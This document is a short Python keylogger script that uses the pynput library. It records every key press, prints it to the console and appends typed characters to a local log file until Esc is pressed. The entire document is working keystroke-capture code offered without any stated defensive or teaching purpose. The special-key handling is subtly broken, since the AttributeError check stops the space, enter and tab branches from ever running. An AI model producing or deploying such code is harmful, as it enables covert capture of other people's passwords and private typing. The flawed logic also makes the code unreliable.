from pynput import keyboard
import time

# Path for the text file to store output
log_file = "keylogger_output.txt"

# Last key press time to track inactivity
last_key_time = time.time()

# Delay for screen inactivity (3 seconds)
inactivity_delay = 3

# Function to write keystrokes to the text file
def write_to_text(key):
    global last_key_time
    
    try:
        # Check if 3 seconds have passed since the last key press
        current_time = time.time()
        if current_time - last_key_time >= inactivity_delay:
            with open(log_file, 'a') as logKey:
                logKey.write('\n')  # Start a new line after 3 seconds of inactivity

        # Handle regular characters
        if key.char:
            with open(log_file, 'a') as logKey:
                logKey.write(key.char)
        
        # Handle special keys
        elif key == keyboard.Key.space:
            with open(log_file, 'a') as logKey:
                logKey.write(' ')  # Space
        elif key == keyboard.Key.enter:
            with open(log_file, 'a') as logKey:
                logKey.write('\n')  # Newline (Enter key)
        elif key == keyboard.Key.tab:
            with open(log_file, 'a') as logKey:
                logKey.write('\t')  # Tab key
        elif key == keyboard.Key.shift or key == keyboard.Key.ctrl or key == keyboard.Key.alt:
            return  # Ignore shift/ctrl/alt keys

        # Update the last key press time
        last_key_time = current_time

    except AttributeError:
        pass

# Function to handle key press
def keyPressed(key):
    print(f"Key pressed: {key}")
    write_to_text(key)

    # Exit on pressing Esc key
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

if __name__ == "__main__":
    print("Keylogger started... Press 'Esc' to stop.")
    
    # Start the listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Wait for the user to stop the script (e.g., pressing 'Esc')
    listener.join()
